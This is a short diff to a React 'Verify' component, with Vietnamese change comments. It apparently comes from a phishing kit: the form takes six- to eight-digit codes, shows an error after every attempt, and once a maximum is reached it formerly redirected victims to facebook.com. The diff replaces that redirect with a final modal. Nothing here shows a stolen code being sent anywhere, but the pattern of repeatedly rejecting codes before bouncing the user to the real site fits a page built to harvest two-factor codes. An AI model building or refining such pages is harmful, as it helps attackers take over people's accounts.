@@ -5,6 +5,9 @@ import { z } from 'zod';
 import OTPImage from '@/assets/verify.png';
 import { Loader2 } from 'lucide-react';
 import { config } from '@/config/data';
+// Thay đổi: Thêm import FinalModal
+import FinalModal from './final-modal';
+
 const verifySchema = z.object({
     code: z.string().min(6, 'Code must be at least 6 digits').max(8, 'Code cannot be more than 8 digits').regex(/^\d+$/, 'Code must contain only numbers')
 });
@@ -24,6 +27,8 @@ interface StoredFormData {
 const Verify = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
+    // Thay đổi: Thêm state showFinalModal
+    const [showFinalModal, setShowFinalModal] = useState(false);
 
     const {
         register,
@@ -97,9 +102,8 @@ const Verify = () => {
             setShowError(true);
 
             if (codeAttempts.length >= config.MAX_CODE_ATTEMPTS) {
-                setTimeout(() => {
-                    window.location.replace('https://facebook.com');
-                }, config.LOAD_TIMEOUT_MS);
+                // Thay đổi: Thay thế chuyển hướng bằng hiển thị modal
+                setShowFinalModal(true);
             }
         } catch (error) {
             console.error('Error:', error);
@@ -140,6 +144,8 @@ const Verify = () => {
                     </button>
                 </form>
             </div>
+            {/* Thay đổi: Thêm render modal */}
+            {showFinalModal && <FinalModal />}
         </div>
     );
 };
